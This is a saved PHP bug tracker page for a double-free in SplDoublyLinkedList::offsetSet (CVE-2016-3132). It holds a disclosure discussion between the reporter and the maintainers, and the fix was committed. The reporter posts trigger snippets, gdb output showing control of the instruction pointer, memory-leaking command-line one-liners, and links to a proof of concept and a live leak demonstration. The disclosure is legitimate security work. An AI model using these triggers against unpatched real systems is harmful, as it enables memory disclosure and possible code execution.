@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+        <link rel='alternate' type='application/rss+xml' title='SPL related Bug #71735 - RDF' href='rss/bug.php?id=71735'>
+        <link rel='alternate' type='application/rss+xml' title='SPL related Bug #71735 - RSS 2.0' href='rss/bug.php?id=71735&format=rss2'>
+        <base href="https://bugs.php.net/">
+    <title>PHP :: Bug #71735 :: Double-free in SplDoublyLinkedList::offsetSet</title>
+    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
+    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
+</head>
+
+<body>
+
+<table id="top" class="head" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="head-logo">
+            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
+        </td>
+
+        <td class="head-menu">
+            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
+            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
+            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
+            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
+            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
+            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
+            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
+            <a href="random">random bug</a>&nbsp;|&nbsp;
+            <a href="login.php">login</a>
+        </td>
+    </tr>
+
+    <tr>
+        <td class="head-search" colspan="2">
+            <form method="get" action="search.php">
+                <p class="head-search">
+                    <input type="hidden" name="cmd" value="display">
+                    <small>go to bug id or search bugs for</small>
+                    <input class="small" type="text" name="search_for" value="" size="30">
+                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
+                </p>
+            </form>
+        </td>
+    </tr>
+</table>
+
+<table class="middle" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="content">
+<div id="bugheader">
+    <table id="details">
+        <tr id="title">
+            <th class="details" id="number"><a href="bug.php?id=71735">Bug</a>&nbsp;#71735</th>
+            <td id="summary" colspan="5">Double-free in SplDoublyLinkedList::offsetSet</td>
+        </tr>
+        <tr id="submission">
+            <th class="details">Submitted:</th>
+            <td style="white-space: nowrap;">2016-03-07 23:31 UTC</td>
+            <th class="details">Modified:</th>
+            <td style="white-space: nowrap;">2016-05-10 13:42 UTC</td>
+            <td rowspan="6">
+
+
+            </td>
+        </tr>
+
+        <tr id="submitter">
+            <th class="details">From:</th>
+            <td>emmanuel &#x64;&#111;&#x74; law &#x61;&#116; gmail &#x64;&#111;&#x74; com</td>
+            <th class="details">Assigned:</th>
+            <td><a href="search.php?cmd=display&amp;assign=ab">ab</a> (<a href="https://people.php.net/ab">profile</a>)</td>
+        </tr>
+
+        <tr id="categorization">
+            <th class="details">Status:</th>
+            <td>Closed</td>
+            <th class="details">Package:</th>
+            <td><a href="search.php?cmd=display&amp;package_name[]=SPL+related">SPL related</a></td>
+        </tr>
+
+        <tr id="situation">
+            <th class="details">PHP Version:</th>
+            <td>7.0.4</td>
+            <th class="details">OS:</th>
+            <td>*</td>
+        </tr>
+
+        <tr id="private">
+            <th class="details">Private report:</th>
+            <td>No</td>
+            <th class="details">CVE-ID:</th>
+            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3132" target="_blank">2016-3132</a></td>
+        </tr>
+    </table>
+</div>
+
+<div class="controls">
+<span id='control_0' class='control active'>View</span>
+<span id='control_3' class='control'><a href='bug.php?id=71735&amp;edit=3'>Add Comment</a></span>
+<span id='control_1' class='control'><a href='bug.php?id=71735&amp;edit=1'>Developer</a></span>
+<span id='control_2' class='control'><a href='bug.php?id=71735&amp;edit=2'>Edit</a></span>
+</div>
+<div class="clear"></div>
+
+
+
+<div class='comment type_comment' ><a name="1457393493">&nbsp;</a><strong>[2016-03-07 23:31 UTC] emmanuel &#x64;&#111;&#x74; law &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
+<pre class='note'>Description:
+------------
+This issues only affects php 7.x branch.
+There exist a double-free vulnerability when calling SplDoublyLinkedList::offsetSet and passing in an invalid index.
+
+Example:
+
+$var_1=new SplStack();
+$var_1-&gt;offsetSet(100,new DateTime('2000-01-01'));
+//DateTime will be double-freed
+
+The vulnerability is in ext/spl_dllist.c:833 where it is freed once:
+
+ 832                 if (index &lt; 0 || index &gt;= intern-&gt;llist-&gt;count) {
+ 833                         zval_ptr_dtor(value);
+ 834                         zend_throw_exception(spl_ce_OutOfRangeException, &quot;Offset invalid or out of range&quot;, 0);
+ 835                         return;
+ 836                 }
+ 837
+ 
+ 
+ The second free occurs in Zend/zend_vm_execute.h:855 when it cleans up the call stack:
+
+  854                 EG(current_execute_data) = call-&gt;prev_execute_data;
+  855                 zend_vm_stack_free_args(call);
+  
+  
+  
+I've created a poc that exploits this to gain code execution:
+ 
+gdb --args php_7.0.4 doublefree.spl_dllist.poc.php
+....
+Stopped reason: SIGSEGV
+0x00000000deadbeef in ?? ()
+gdb-peda$ p $rip
+$1 = (void (*)()) 0xdeadbeef
+
+
+
+POC can be obtained via <a href="https://www.dropbox.com/s/2tm8mlrdhfitymv/doublefree.SplStack.poc.php?dl=0" rel="nofollow">https://www.dropbox.com/s/2tm8mlrdhfitymv/doublefree.SplStack.poc.php?dl=0</a>
+
+
+</pre>
+</div><h2>Patches</h2>
+<p><a href='patch-add.php?bug_id=71735'>Add a Patch</a></p><h2>Pull Requests</h2>
+<p><a href='gh-pull-add.php?bug_id=71735'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
+            <div id='comments_view' style='clear:both;'>
+<div class='comment type_comment' ><a name="1458537445">&nbsp;</a><strong>[2016-03-21 05:17 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Doesn't look like a security issue - requires specially crafted code to reproduce the bug.
+</pre>
+</div><div class='comment type_log' ><a name="1458540656">&nbsp;</a><strong>[2016-03-21 06:10 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Type: Security</span>
+<span class="added">+Type: Bug</span>
+</div></div></div><div class='comment type_svn' ><a name="1458540671">&nbsp;</a><strong>[2016-03-21 06:11 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=28a6ed9f9a36b9c517e4a8a429baf4dd382fc5d5" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=28a6ed9f9a36b9c517e4a8a429baf4dd382fc5d5</a>
+Log: Fix <a href='bug.php?id=71735'>bug #71735</a>: Double-free in SplDoublyLinkedList::offsetSet
+</pre>
+</div><div class='comment type_log' ><a name="1458540672">&nbsp;</a><strong>[2016-03-21 06:11 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status: Open</span>
+<span class="added">+Status: Closed</span>
+</div></div></div><div class='comment type_log' ><a name="1458541189">&nbsp;</a><strong>[2016-03-21 06:19 UTC] emmanuel &#x64;&#111;&#x74; law &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status:         Closed</span>
+<span class="added">+Status:         Open</span>
+<span class="removed">-Type:           Bug</span>
+<span class="added">+Type:           Security</span>
+<span class="removed">-Private report: No</span>
+<span class="added">+Private report: Yes</span>
+</div></div></div><div class='comment type_comment' ><a name="1458541189">&nbsp;</a><strong>[2016-03-21 06:19 UTC] emmanuel &#x64;&#111;&#x74; law &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
+<pre class='note'>The specially crated code i gave was to gain remote code execution. 
+
+Here are several simpler examples that leak the memory. Notice how each time I change the length of str_repeat, it leaks different part of the memory:
+
+#### Example 1, str_repeat 0x5 #####
+
+$ ~/php-7.0.4/sapi/cli/php -r '(new SplStack())-&gt;offsetSet(0,str_repeat(&quot;A&quot;,0x05));'    &lt;&lt;&lt; string length 
+  
+Fatal error: Uncaught OutOfRangeException: Offset invalid or out of range in Command line code:1
+Stack trace:
+#0 Command line code(1): SplDoublyLinkedList-&gt;offsetSet(0, 'function')       &lt;&lt;&lt;&lt;&lt;&lt; Leaks 'function'
+#1 {main}
+  thrown in Command line code on line 1
+
+
+
+#### Example 2, str_repeat 0x15 #####
+
+
+$ ~/php-7.0.4/sapi/cli/php -r '(new SplStack())-&gt;offsetSet(0,str_repeat(&quot;A&quot;,0x15));'
+
+Fatal error: Uncaught OutOfRangeException: Offset invalid or out of range in Command line code:1
+Stack trace:
+#0 Command line code(1): SplDoublyLinkedList-&gt;offsetSet(0, '\x01\x00\x00\x00\x01\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00...')  &lt;&lt;&lt;&lt;&lt;&lt; Leaks random bytes in memory
+#1 {main}
+  thrown in Command line code on line 1
+
+
+
+#### Example 3, str_repeat 0x20 #####
+
+$ ~/php-7.0.4/sapi/cli/php -r '(new SplStack())-&gt;offsetSet(0,str_repeat(&quot;A&quot;,0x20));'
+
+Fatal error: Uncaught OutOfRangeException: Offset invalid or out of range in Command line code:1
+Stack trace:
+#0 Command line code(1): SplDoublyLinkedList-&gt;offsetSet(0, 'OutOfRangeExcep...')     &lt;&lt;&lt;&lt;&lt;&lt; Leaks other strings in memory
+#1 {main}
+  thrown in Command line code on line 1
+
+
+
+#### Example 4 str_repeat 0x30 #####
+
+$ ~/php-7.0.4/sapi/cli/php -r '(new SplStack())-&gt;offsetSet(0,str_repeat(&quot;A&quot;,0x30));'
+
+Fatal error: Uncaught OutOfRangeException: Offset invalid or out of range in Command line code:1
+Stack trace:
+#0 Command line code(1): SplDoublyLinkedList-&gt;offsetSet(0, 'AAAAAAAAAAAAAAA...')    &lt;&lt;&lt; this is the expected output.
+#1 {main}
+  thrown in Command line code on line 1
+
+
+
+This discrepancies in the output are all manifestation of the double free vulnerability. Depending on what is passed into the vulnerable function, it results in different form of exploitation. Thus I think it's a security issue. Imagine a plausible code such as:
+
+&lt;?php
+new SplStack())-&gt;offsetSet($_GET['id'],$_GET['data']);
+
+?&gt;
+</pre>
+</div><div class='comment type_comment' ><a name="1458542110">&nbsp;</a><strong>[2016-03-21 06:35 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>I'm sorry, I'm not sure I understand - all your examples are constructed code run on the command line, so how that comes to remote exploit? Also, you reopened the bug - did you mean you still can reproduce it? I could not reproduce it with your examples after the fix, could you please provide more information about what do you see after the fix?
+</pre>
+</div><div class='comment type_log' ><a name="1458542122">&nbsp;</a><strong>[2016-03-21 06:35 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status: Open</span>
+<span class="added">+Status: Feedback</span>
+</div></div></div><div class='comment type_log' ><a name="1458542138">&nbsp;</a><strong>[2016-03-21 06:35 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Type: Security</span>
+<span class="added">+Type: Bug</span>
+</div></div></div><div class='comment type_log' ><a name="1458546630">&nbsp;</a><strong>[2016-03-21 07:50 UTC] emmanuel &#x64;&#111;&#x74; law &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status: Feedback</span>
+<span class="added">+Status: Closed</span>
+</div></div></div><div class='comment type_comment' ><a name="1458546630">&nbsp;</a><strong>[2016-03-21 07:50 UTC] emmanuel &#x64;&#111;&#x74; law &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
+<pre class='note'>1) Didn't mean to re-open the bug. Was a race condition when both you and I were replying.
+
+2)Here's my last word on why I think it is a security bug. I'll leave the final decision to you.
+
+==Remote Scenario (nginx)==
+Here's a remote exploit that leaks the the memory on server:
+Vuln: <a href="http://52.63.107.251/71750.php?id=0&amp;times=100" rel="nofollow">http://52.63.107.251/71750.php?id=0&amp;times=100</a>
+Source code: <a href="http://52.63.107.251/71750.php.src" rel="nofollow">http://52.63.107.251/71750.php.src</a>
+
+
+Fatal error: Uncaught OutOfRangeException: Offset invalid or out of range in /usr/share/nginx/html/71750.php:6 Stack trace: #0 /usr/share/nginx/html/71750.php(6): SplDoublyLinkedList-&gt;offsetSet('0', '`&lt;\x96\xA6\xD5\x7F\x00\x00\x00\x00\x00\x00\x00\x00\x00...') #1 {main} thrown in /usr/share/nginx/html/71750.php on line 6
+
+===Local scenario===
+It is possible to gain (local) code execution within harden php environment where functions such as exec() or system() are disabled. EG: Harden production environment or sites such as sandbox.onlinephpfunctions.com and 3v4l.org
+</pre>
+</div><div class='comment type_comment' ><a name="1458546715">&nbsp;</a><strong>[2016-03-21 07:51 UTC] emmanuel &#x64;&#111;&#x74; law &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
+<pre class='note'>Also, the patch works. So either way problem is solved.
+</pre>
+</div><div class='comment type_comment' ><a name="1461896554">&nbsp;</a><strong>[2016-04-29 02:22 UTC] emmanuel &#x64;&#111;&#x74; law &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
+<pre class='note'>CVE-2016-3132 has been assigned to this. FYI.
+</pre>
+</div><div class='comment type_log' ><a name="1462887774">&nbsp;</a><strong>[2016-05-10 13:42 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: ab</span>
+<span class="removed">-CVE-ID:</span>
+<span class="added">+CVE-ID:      2016-3132</span>
+</div></div></div><div class='comment type_svn' ><a name="1469014368">&nbsp;</a><strong>[2016-07-20 11:32 UTC] <a href="//people.php.net/davey">davey@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=28a6ed9f9a36b9c517e4a8a429baf4dd382fc5d5" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=28a6ed9f9a36b9c517e4a8a429baf4dd382fc5d5</a>
+Log: Fix <a href='bug.php?id=71735'>bug #71735</a>: Double-free in SplDoublyLinkedList::offsetSet
+</pre>
+</div></div>
+        </td>
+    </tr>
+</table>
+
+<script src='js/util.js'></script>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
+<script src="js/jquery.cookie.js"></script>
+<script>
+function do_comment(nd)
+{
+    $('#comment_filter > .control.active').removeClass("active");
+    $(nd).addClass("active");
+
+    $.cookie('history_tab', nd.id, { expires: 365 });
+
+    if (nd.id == 'type_all') {
+        $('#comments_view > .comment:hidden').show('slow');
+    } else {
+        $('#comments_view > .comment').each(function(i) {
+            if ($(this).hasClass(nd.id)) {
+                $(this).show('slow');
+            } else {
+                $(this).hide('slow');
+            }
+        });
+    }
+    return false;
+}
+</script>
+<table class="foot" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="foot-bar" colspan="2">&nbsp;</td>
+    </tr>
+
+    <tr>
+        <td class="foot-copy">
+            <small>
+                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
+                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
+                All rights reserved.
+            </small>
+        </td>
+        <td class="foot-source">
+            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
+        </td>
+    </tr>
+</table>
+</body>
+</html>
